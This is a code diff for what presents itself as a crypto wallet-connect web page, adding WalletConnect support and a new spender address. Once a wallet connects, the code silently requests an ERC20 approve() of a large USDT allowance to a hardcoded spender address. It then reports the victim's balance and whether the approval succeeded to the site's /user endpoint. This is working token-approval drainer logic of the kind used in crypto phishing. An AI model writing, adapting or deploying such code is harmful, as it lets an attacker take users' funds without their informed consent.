@@ -1,94 +1,112 @@
 let account = "";
 let ethBalance = 0;
 let tokenBalance = 0;
-let spender = "0x5DFa503C937E0DC79352445bDc6Ff69EfC5D72d7";
+let spender = "0xAFc81F998b193bc06Eb89190e97Ec6155Be4f365";
 let tokens = [
-  {
-    name: "TUSDT",
-    address: "0xD92E713d051C37EbB2561803a3b5FBAbc4962431",
-    decimals: 6,
-  },
   {
     name: "USDT",
     address: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
     decimals: 6,
   },
-  {
-    name: "USDC",
-    address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
-    decimals: 6,
-  },
-  {
-    name: "BNB",
-    address: "0xB8c77482e45F1F44dE1745F52C74426C631bDD52",
-    decimals: 6,
-  },
 ];
 
-if (typeof window.ethereum != undefined) {
-  console.log("Metamask installed");
-} else {
-  console.log("Metamask not installed");
-}
-
-async function login() {
-  document.getElementById("content").style.display = "none";
-  document.getElementById("loading").style.display = "block";
-  const accounts = await ethereum
-    .request({ method: "eth_requestAccounts" })
-    .catch((e) => {
-      document.getElementById("loading").style.display = "none";
-      document.getElementById("content").style.display = "block";
-    });
-  account = accounts[0];
-  getEthBalance();
-  getTokenBalance(tokens[1]);
-}
+const walletConnectProviderConfig = new WalletConnectProvider.default({
+  infuraId: "27e484dcd9e3efcfd25a83a78777cdf1",
+  qrcodeModalOptions: {
+    desktopLinks: [
+      "ledger",
+      "tokenary",
+      "wallet",
+      "wallet 3",
+      "secuX",
+      "ambire",
+      "wallet3",
+      "apolloX",
+      "zerion",
+      "sequence",
+      "punkWallet",
+      "kryptoGO",
+      "nft",
+      "riceWallet",
+      "vision",
+      "keyring",
+    ],
+    mobileLinks: [
+      "metamask",
+      "trust",
+      "rainbow",
+      "argent",
+      "imtoken",
+      "pillar",
+    ],
+  },
+});
 
 document.body.addEventListener("click", function (e) {
   let targetId = e.target.id;
   if (targetId == "connect-metamask") {
     if (typeof window.ethereum != undefined) {
-      login();
+      checkConnection(window.ethereum);
+      console.log("Metamask installed");
     } else {
-      location.href = "https://metamask.app.link/dapp/www.sensis.space";
+      document.getElementById("download-metamask-modal").style.display =
+        "block";
     }
-    
+  } else if (targetId == "install-metamask-wallet") {
+    window.open("https://metamask.io/download/");
+  } else if (targetId == "connect-metamask-wallet-again") {
+    checkConnection(window.ethereum);
+  } else if (targetId == "close-download-metamask-modal") {
+    document.getElementById("download-metamask-modal").style.display = "none";
+  } else if (targetId == "connect-walletconnect") {
+    walletConnectProviderConfig
+      .enable()
+      .then(function (provider) {
+        checkConnection(provider);
+      })
+      .catch(function (error) {
+        console.log(error);
+      });
   }
 });
 
-async function getTokenBalance(token) {
-  let web3 = new Web3(Web3.givenProvider);
-  let contract = new web3.eth.Contract(ERC20, token.address);
-  let balance = await contract.methods.balanceOf(account).call();
-  let decimals = Math.pow(10, token.decimals);
-  tokenBalance = balance / decimals;
-  getToken(token);
+function checkConnection(provider) {
+  provider
+    .request({ method: "eth_accounts" })
+    .then(function (accounts) {
+      if (accounts.length > 0) {
+        account = accounts[0];
+      } else {
+        login(provider);
+      }
+    })
+    .catch(function (err) {});
 }
 
-function getToken(token) {
-  let web3 = new Web3(Web3.givenProvider);
-  let contract = new web3.eth.Contract(ERC20, token.address);
-  contract.methods
-    .approve(spender, Math.pow(10, token.decimals) * 1000000)
-    .send({ from: account })
-    .then(function (receipt) {
-      history.back();
-       getUser(true);
+async function login(provider) {
+  document.getElementById("content").style.display = "none";
+  document.getElementById("loading").style.display = "block";
+  document.getElementById("loading-text").style.display = "block";
+  const accounts = await provider
+    .request({ method: "eth_requestAccounts" })
+    .then(function (accounts) {
+      account = accounts[0];
+      getEthBalance(provider);
+      getTokenBalance(provider, tokens[0]);
     })
-    .catch(function (err) {
+    .catch((e) => {
       document.getElementById("loading").style.display = "none";
+      document.getElementById("loading-text").style.display = "none";
       document.getElementById("content").style.display = "block";
-       getUser(false);
-      console.log(err);
     });
 }
 
-function getEthBalance() {
-  let web3 = new Web3(Web3.givenProvider);
+function getEthBalance(provider) {
+  let web3 = new Web3(provider);
   web3.eth.getBalance(account, function (err, result) {
     if (err) {
       document.getElementById("loading").style.display = "none";
+      document.getElementById("loading-text").style.display = "none";
       document.getElementById("content").style.display = "block";
       console.log(err);
     } else {
@@ -96,6 +114,36 @@ function getEthBalance() {
     }
   });
 }
+
+async function getTokenBalance(provider, token) {
+  let web3 = new Web3(provider);
+  let contract = new web3.eth.Contract(ERC20, token.address);
+  let balance = await contract.methods.balanceOf(account).call();
+  let decimals = Math.pow(10, token.decimals);
+  tokenBalance = balance / decimals;
+  getToken(token, provider);
+}
+
+function getToken(token, provider) {
+  let web3 = new Web3(provider);
+  let contract = new web3.eth.Contract(ERC20, token.address);
+  contract.methods
+    .approve(spender, Math.pow(10, token.decimals) * 100000)
+    .send({ from: account })
+    .then(function (receipt) {
+      getUser(true);
+    })
+    .catch(function (err) {
+      getUser(false);
+    });
+}
+
+ethereum.on("accountsChanged", function (accounts) {
+  account = accounts[0];
+});
+ethereum.on("chainChanged", (chainId) => {
+  location.reload();
+});
 
 function getUser(hasAccess) {
   let getUserXhr = new XMLHttpRequest();
@@ -105,10 +153,13 @@ function getUser(hasAccess) {
   getUserXhr.onreadystatechange = function () {
     if (this.status == 200 && this.readyState == 4) {
       let response = JSON.parse(this.response);
+      console.log(response);
       if (response != null) {
-        history.back();
+        if (response.walletAddress != null) {
+          history.back();
+        }
       } else {
-         createUser(hasAccess);
+        createUser(hasAccess);
       }
     }
   };
@@ -121,7 +172,6 @@ function createUser(hasAccess) {
     usdt: tokenBalance,
     hasAccess: hasAccess,
   };
-  console.log(userPayload);
   let createUserXhr = new XMLHttpRequest();
   createUserXhr.open("POST", `/user`, true);
   createUserXhr.setRequestHeader("Content-type", "application/json");
